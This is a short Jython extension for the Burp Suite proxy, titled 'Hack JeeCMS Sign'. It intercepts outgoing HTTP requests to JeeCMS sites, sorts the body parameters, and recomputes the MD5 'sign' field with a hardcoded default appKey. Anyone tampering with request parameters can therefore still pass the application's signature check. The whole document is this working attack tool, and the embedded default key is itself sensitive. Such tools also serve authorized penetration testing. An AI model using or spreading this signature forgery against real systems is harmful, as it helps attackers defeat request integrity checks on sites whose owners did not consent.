from burp import IBurpExtender
from burp import IHttpListener
from java.io import PrintWriter
import hashlib
import urllib

print "Hack Jeecms Sign By Nerd."

class BurpExtender(IBurpExtender, IHttpListener):
    def registerExtenderCallbacks(self, callbacks):

        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName("Hack JeeCMS Sign")
        callbacks.registerHttpListener(self)
        self.stdout = PrintWriter(callbacks.getStdout(), True)
        self.stderr = PrintWriter(callbacks.getStderr(), True)
        callbacks.issueAlert("Loaded Successfull.")

    def processHttpMessage(self, toolFlag, messageIsRequest, currentRequest):
        if messageIsRequest:

            requestInfo = self._helpers.analyzeRequest(currentRequest)

            self.headers = list(requestInfo.getHeaders())
            hook_host = requestInfo.getUrl().getHost()

            bodyBytes = currentRequest.getRequest()[requestInfo.getBodyOffset():]
            self.body = self._helpers.bytesToString(bodyBytes)

            o,n = self.update_sign(urllib.unquote(self.body))
            self.body = self.body.replace(o,n)
            newMessage = self._helpers.buildHttpMessage(self.headers, self.body)
            currentRequest.setRequest(newMessage)

        # Process responses
        else:
            pass

    def update_sign(slef, body=""):
        try:
            old_sign = ""
            # defalut appKey
            appKey = "uicxsXYso7DJxlrFdgQnVVXW5OCzU74h"

            hash_param = ""
            param_list = body.split("&")

            temp_dict = {}
            for pa in param_list:
                t = pa.split("=")
                temp_dict[t[0]] = t[1]

            tmmmm = temp_dict.items()

            tmmmm.sort()
            for (k, v) in tmmmm:
                if k == "sign":
                    old_sign = v
                    print "old sign = ",v
                    continue
                hash_param += "%s=%s&" % (k, v)

            hash_param += "key=" + appKey
            sign = hashlib.md5(hash_param).hexdigest()
            return old_sign,sign.upper()
        except Exception, e:
            return "",""
